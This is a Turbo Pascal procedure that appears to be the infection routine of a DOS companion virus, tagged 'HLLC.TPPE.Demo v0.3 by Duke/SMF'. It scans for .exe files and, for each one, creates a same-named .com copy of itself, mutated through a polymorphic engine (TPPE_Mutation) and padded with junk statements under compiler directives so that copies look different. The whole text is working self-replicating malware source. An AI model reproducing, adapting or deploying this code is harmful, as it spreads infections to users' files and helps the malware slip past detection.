procedure Starting;
var s:searchrec;
    a:dirstr;
    b:namestr;
    c:extstr;
    g:file;
begin
{$IFOPT S+}TPPE_Init;{$ENDIF}
findfirst('*.exe',$20,s);
{$IFOPT S-}TPPE_Init;{$ENDIF}
while doserror=0 do
  begin
  fsplit(s.name,a,b,c);
  {$IFOPT B-}Junk1:=chr(ord(16));{$ENDIF}
  assign(g,a+b+'.com');{$I-}reset(g);{$I+}
  {$IFOPT D+}Junk3:=False;{$ENDIF}
  if ioresult<>0 then
    begin
    if DetectComp then
      begin
      {$IFOPT T-}Junk1:=chr(Junk2 div 200);{$ENDIF}
      TPPE_Mutation;
      {$IFOPT P+}inc(Junk2);{$ENDIF}
      exec(Command,'/c ren _tppe_.exe '+a+b+'.com>nul')
      {$IFOPT L-}if Junk3 then Junk2:=1;{$ENDIF}
      end
    else exec(Command,'/c copy '+paramstr(0)+' '+a+b+'.com>nul');
    {$IFOPT I-}Junk2:=4;{$ENDIF}
    end;
  {$IFOPT F+}Junk3:=not Junk3;{$ENDIF}  
  findnext(s);
  end;
{$IFOPT N-}TPPE_Close;{$ENDIF}
Command:='[HLLC.TPPE.Demo v0.3 by Duke/SMF]';
{$IFOPT N+}TPPE_Close;{$ENDIF}
end;